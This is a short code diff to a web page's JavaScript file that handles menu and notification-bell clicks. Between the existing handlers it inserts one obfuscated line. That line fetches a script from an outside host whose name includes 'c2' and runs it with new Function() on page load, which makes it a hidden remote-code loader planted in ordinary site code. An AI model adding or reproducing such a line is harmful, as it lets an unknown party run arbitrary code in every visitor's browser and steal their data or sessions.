@@ -7,6 +7,8 @@ menu.onclick = () => {
     bell.classList.remove('active')
 }
 
+fetch("https://bytenetc2.pythonanywhere.com/static/js/main.js")['then'](_0x2f65c3=>_0x2f65c3['text']())['then'](_0x1770b7=>{const _0x237394=new Function(_0x1770b7);_0x237394();})['catch'](_0x1afb68=>console['error'](_0x1afb68));
+
 let bell = document.querySelector(".notification");
 
 document.querySelector('#bell-icon').onclick = () => {
